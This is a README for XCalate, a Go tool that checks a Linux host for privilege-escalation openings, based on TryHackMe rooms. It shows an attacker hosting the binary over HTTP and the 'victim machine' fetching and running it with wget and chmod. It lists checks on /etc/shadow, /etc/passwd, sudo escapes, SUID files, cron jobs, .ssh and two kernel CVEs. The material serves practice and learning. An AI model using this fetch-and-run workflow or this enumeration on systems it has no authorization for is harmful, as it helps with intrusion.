# XCalate
A privilege escalation tools based on TryHackMe.

Run simple check (not thorough) for possible vector of privilege escalation.

# Installation
>Tested with go version go1.24.0
1. git clone https://github.com/7imbitz/XCalate.git
2. cd XCalate
3. GOOS=linux GOARCH=amd64 go build -o XCalate cmd/main.go
4. Transfer the binary to the victim machine

```bash
sudo python3 -m http.server 80 #host
wget 10.10.10.10/XCalate
chmod +x XCalate
./XCalate
```

# reference
- https://tryhackme.com/r/room/linuxprivesc
- https://tryhackme.com/r/room/windows10privesc

In the meantime it checks for 
- Linux
    - ✅ Possible Service Exploits
    - ✅ Weak File Permissions
        - ✅ /etc/shadow - Readable & Writable
        - ✅ /etc/passwd - Writable
    - ✅ Sudo - Shell Escape Sequences
    - ✅ SUID Executable
    - ✅ Cron Jobs
        - ✅ Overwrite custom cronjob - Writable
        - ✅ Check user's path inside the file
        - ✅ Usage of wildcards in cronjob
    - ✅ History
    - ✅ .ssh
    - ✅ kernel check for 
        - ✅ CVE-2021-3493
        - ✅ CVE-2022-0847

- Window
    - To be continued...